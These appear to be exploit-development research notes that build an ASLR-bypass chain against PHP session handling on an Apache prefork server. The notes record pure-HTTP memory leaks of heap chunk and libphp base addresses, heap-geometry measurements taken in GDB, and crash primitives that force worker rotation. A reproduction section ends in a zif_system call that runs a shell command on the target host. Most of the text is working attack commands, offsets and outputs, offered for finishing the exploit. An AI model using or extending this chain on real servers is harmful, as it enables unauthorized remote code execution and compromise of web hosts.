# Pure-HTTP ASLR Chain: Worker Rotation Research Notes

Date: 2026-10-21
Reference result: [ASLR_PURE_HTTP.md](ASLR_PURE_HTTP.md) (another run achieved 5/5, rotating workers between stages with SIGSEGV)
Constraints: Attack requests use HTTP only; **no instrumentation is performed on target 172.16.0.103** (no GDB, no /proc reads, no target-side PHP). All GDB measurements in this document were taken on our own calibration lab, 172.16.1.112, without touching the target process.

Status: **The address leaks and RCE endpoint are already pure HTTP; the only remaining engineering item is how to rotate workers between stages using a single HTTP request.** That has not yet been solved in this research log; this document records the blocker and next steps.

---

## 1. Verified (All on 172.16.0.103, HTTP Requests Only)

### 1.1 Stage 2 Leak on a Fresh Master

~~~text
$ sudo -n apache2ctl -k stop; sudo -n apache2ctl -k start
$ python3 send_a_leak3.py 1001 5 39 12 17
$ python3 b_target.py 443 16 983

Set-Cookie: PHPSESSID=%10%00%00%00%00%00%00%00P%3C%E1%01%A6%7F%00%00; path=/
pDestructor = 0x7fa601e13c50
libphp      = 0x7fa601800000   (pDestructor - 0x613c50)
~~~

`(p & 0x1fffff) == 0x13c50`; libphp is 2 MB aligned, so the leak is valid.

### 1.2 Stage 1 + Stage 2 Work on the **Same Worker**

~~~text
W0=882266
after A1 W=882266
after B1 W=882266
after A2 W=882266
after B2 W=882266
~~~

That is:

1. `send_a_leak2.py 1001 12` + `b_numleak2.py 892 1 0x1000` → chunk base.
2. On the same worker, `send_a_leak3.py 1001 5 39 12 17` + `b_target.py 443 16 983` → libphp base (still returns the 16-byte `pDestructor`).

This shows that “every stage needs a fresh worker” is not true. **The two leaks can share one worker history; only stage 3 needs a rotation beforehand.**

### 1.3 HTTP Crash Rotation Works on a **Fresh Worker**

~~~text
FRESH W=881054
after A W=881054
CRASHED new=881148 at 17
final W=881148
~~~

This uses the driver's `rotate()`:

~~~text
send_a_pad.py 17 19 3 12 7:7 7:7 7:7 7:7 7:7 7:7
send_b_rce2.py 15 2 0x1 0x1 x
~~~

`send_b_rce2` places the fake reference at `R0-0x10` in a fresh worker; `val.value=1`, so `zend_array_destroy(1)` causes SIGSEGV and prefork forks a new worker immediately.

---

## 2. Failure: HTTP Rotation Does Not Work on a Worker That Has Served Leak Requests

### 2.1 Result from the Official Driver with Signals Removed and Only HTTP Rotation

On .103, the only change to `pure_aslr_run.sh` was replacing sudo with `sudo -n`:

~~~text
W1=877061 chunk=0x7f6beba00000 attempt=1
W2=877299 libphp=0x0 attempt=1
W2=877349 libphp=0x0 attempt=2
LIBPHP_LEAK_FAILED
~~~

Stage 1 succeeded. After HTTP rotation, stage 2 failed to obtain the libphp leak twice (`b_target.py` did not return the 16-byte `Set-Cookie`).

### 2.2 Direct Observation of Rotation

After stage 1, sent `send_a_pad + send_b_rce2(HT=1)` six times in a row. The worker PID **never changed**:

~~~text
PHASE1 W=879429
no-rotate try=1 W=879429
...
no-rotate try=6 W=879429
STAGE2 W=879429
SETCOOKIE_LEN 72
VALUE Set-Cookie: PHPSESSID=%10...P%3CaP%EA%7F...
~~~

Stage 2 succeeded on the same worker in this run, confirming:

- The crash request does not trigger rotation after used history.
- Stage 2 does not require a fresh worker (consistent with 1.2).

---

## 3. Root Cause (GDB Measurements on the .112 Calibration Lab)

> Addresses below are chunk-relative values from the no-ASLR lab. The target uses ASLR, but the chunk geometry is the same. Measurements did not involve 172.16.0.103.

### 3.1 Fresh Stage 3 Geometry

- A, `send_a_pad 17 19 3 12 6×7:7`: `PS(http_session_vars).value.ref = chunk + 0x24e0`.
- `R0 - 0x10 = chunk + 0x24d0`, exactly the start of the free 56-byte bin block.
- B, `send_b_zif 15 2 ...`: the 55-byte fake-reference raw buffer lands here; fake-reference fields begin at raw+0x10 and align with `R0`.

### 3.2 Used-History Geometry Is Different

First run stages 1 and 2 on the same worker, then send stage 3 A:

| Pads P | R0 | R0 page | Map for that page during B track_init |
|---|---|---|---|
| 6 | chunk+0x1560 | page 1 | `0x80000003` = 32B bin |
| 7 | chunk+0x15c0 | page 1 | `0x80000003` = 32B bin |
| 45 | chunk+0x7d400 | page 125 | `0xc0030018` = NRUN/large-block continuation page |
| 640 | chunk+0x8b320 | page 139 | `0x0` = free FRUN page |

By comparison, the fresh worker's `R0=chunk+0x24e0` page is a 56B bin page (the 56B free-list head is `chunk+0x24d0`).

Conclusions:

1. **With used history, `R0` lands on a 32B bin page**, not a 56B page.
2. `send_b_zif`'s 55B fake-reference raw buffer uses the 56B bin and **cannot be allocated into a 32B page**.
3. Even if P moves `R0` to a 56B-aligned slot (for example, with P=7, `R0-0x10=chunk+0x15b0`), the page is still a 32B bin during B (`map=0x80000003`), so the 56B raw buffer still cannot land there.
4. At P=640, the `R0` page is FRUN (the whole page is free), but the 56B bin's current head remains `chunk+0x24d0`. The allocator does not take that high-address free page for a few dozen 56B allocations.

### 3.3 B May Not Reach track_init at All with Used History

For a fresh worker, a breakpoint at `session.c:481` (the `php_session_track_init()` call) is hit by A+B, and the reference is visible. With used history (after stages 1+2, A with P=6), the same breakpoint was set and B (`b_crash7.py 14`) sent, but it **never hit**. Neither did `php_session_rfc1867_cleanup` or `php_session_initialize`.

This suggests two possible cases with used history, depending on P/timing:

- A itself aborts during request shutdown, so B is handled by a new worker forked by the parent. The new worker has no dangling reference, so `track_init` cannot destroy it.
- Or B's END cleanup returns early inside `php_session_initialize()` and never reaches `track_init`.

Either way, **the fake-reference trigger point from fresh stage 3 does not hold with used history**. This is why the same-worker scan for P=50..75 produced only `nop`.

---

## 4. What the Pure-HTTP Path Needs

To finish the last step without touching the target, there are two options:

### 4.1 Reliable HTTP Worker Rotation (Recommended)

Split leaks and exploitation across fresh workers:

~~~text
W1 (fresh): stage 1 + stage 2 leaks (verified on the same worker)
HTTP crash W1 -> W2 (fresh; prefork inherits the same master's ASLR)
W2 (fresh): stage 3 exploit (existing fresh parameters are verified)
~~~

The missing piece is crashing W1 after it has been used. The current `rotate()` using `send_a_pad + send_b_rce2(HT=1)` works only on a fresh worker.

Pure-HTTP crash primitives to try:

1. **`b_crash7` (32B live string)**
   - Use N seven-byte values (32B zend_strings) to overwrite used `R0`.
   - `R0` is a 32B slot, matching a 32B value string.
   - `PS(http_session_vars)` is still treated as a reference: `h=0` is read as `val.value` and `len=7` as `IS_ARRAY` → `zend_array_destroy(NULL)` crashes. This **does not require rebinning into a 56B page and is not affected by the free-list shadow**.
   - Blocker: B must reach `track_init` and the old reference must still exist (with used history it may already be UNDEF, or B may be handled by a new worker). Calibrate N for used history and first confirm A does not crash.
2. **Make A deterministically abort during shutdown**
   - A sometimes aborts with used history (P=50/68 produced `W3=0`), but this is not controlled.
   - Find an A shape that reliably makes the stale 32B `PS(http_session_vars)` block trigger `zend_mm_panic` during heap reset, after A's response has been sent.
3. **Find a deterministic malformed-multipart/Apache crash**
   - Must use only HTTP and not depend on PHP heap layout. Nothing has been found yet.

### 4.2 Skip Rotation and Calibrate Stage 3 Directly for Used History

This requires solving all of the following:

1. The page containing `R0` must be a 56B bin page (or the fake-reference layout must match 32B).
2. The 56B fake raw buffer must land on the specific free slot at `R0-0x10`.
3. A must not crash, and B must reach `track_init`.
4. Recalibrate the fake HT carrier address for `send_b_zif` (fresh worker uses `chunk+0x6e0d8`).

There is already a counterexample to 1/3: the page is 32B and B does not hit the breakpoint. This path is likely more expensive.

---

## 5. Recommended Next Experiment

Prioritize 4.1.1 (`crash7`) because it needs only **32B geometry**, which naturally matches used `R0`:

1. On .112, reproduce used history (stages 1+2 on one worker), use A with P=6, and set a breakpoint at `session.c:481` to confirm whether `PS(http_session_vars)` is still a reference after A, along with the id/send_cookie state.
2. If the reference exists after A, scan `b_crash7.py N` and inspect the qwords at `R0`:
   - `q0 = 0x0000000600000001` (live string, rc=1/type=6)
   - `q2 = 7` (len=7)
   - `q3 = 0x0076767676767676` ('v'*7)
   This indicates a hit.
3. After a hit, send `b_crash7.py N` without GDB and confirm the worker PID changes.
4. On .103, use HTTP only:
   - Fresh W1: stage 1 + stage 2 leaks.
   - Rotate with `send_a_pad P=6 + b_crash7 N`.
   - Fresh W2: stage 3 with six pads in `send_a_pad` + `send_b_zif 15 2 HTDATA ZIF`, using addresses from W1 (prefork inherits the master's ASLR, so chunk/libphp bases stay the same after the worker is forked again; see section 5 of ASLR_PURE_HTTP.md).
5. If the old reference does not exist after A with used history, next try to make stage 2 B abort after its leak. Change `b_target`'s target-array layout so `zend_string_release_ex(PS(id))` reaches `efree` on an invalid internal pointer; W1 then rotates naturally after stage 2, and fresh W2 can run stage 3.

---

## 6. Reproduction Commands (.103, Pure HTTP; No GDB/maps)

~~~bash
# 1) Fresh master
sudo -n apache2ctl -k stop; sudo -n apache2ctl -k start; sleep 0.5

# 2) W1: chunk and libphp leaks on the same worker
python3 send_a_leak2.py 1001 12; sleep 0.2
python3 b_numleak2.py 892 1 0x1000; sleep 0.2
python3 send_a_leak3.py 1001 5 39 12 17; sleep 0.2
python3 b_target.py 443 16 983
# Parse /tmp/b_numleak2.resp -> chunk; /tmp/b_target.resp -> pDestructor

# 3) Pure-HTTP rotation (N still needs calibration)
python3 send_a_pad.py 17 19 3 12 7:7 7:7 7:7 7:7 7:7 7:7
python3 b_crash7.py <N>

# 4) W2: fresh stage 3
HT=$(chunk+0x6e0d8); ZIF=$(libphp+0x43a870)
python3 send_a_pad.py 17 19 3 12 7:7 7:7 7:7 7:7 7:7 7:7
python3 send_b_zif.py 15 2 $HT $ZIF 'id>/tmp/p1'
~~~

---

## 7. Files

| File | Purpose |
|---|---|
| `tools/b_crash7.py` | 32B live-string crash primitive (N still needs calibration) |
| `tools/refq2.gdb` / `flow.gdb` | Inspect used-history reference/track_init flow on .112 |
| `tools/pagemap.gdb` | Read R0 page `chunk->map` / `free_slot` on .112 |
| `tools/send_b_probe.py` / `b_probe_long.py` | Probe fake-reference landing point |
| `tools/same_worker_trials.py` | Same-worker stage 3 P scan (.112) |
| `tools/pure_aslr_run.sh` | Earlier driver (includes HTTP rotation, which is unstable on used workers) |

---

## 8. Conclusion

- **The attack requests, both address leaks, and `zif_system` endpoint are all pure HTTP.**
- The recorded 5/5 run used SIGSEGV to rotate between stages. The script's HTTP `rotate()` is reliable only on a fresh worker and does not trigger after leak requests have been served.
- With used history, `R0` lands on a 32B bin page, while the fresh stage 3 fake-reference raw buffer uses a 56B bin. The page was not rebinned, so the landing geometry does not work.
- The shortest path to completion is: **stage 1+2 on one worker → pure-HTTP crash with `b_crash7` (32B) → existing stage 3 on fresh W2**. Calibrate crash7's N for used history and first verify that A leaves the old reference intact.
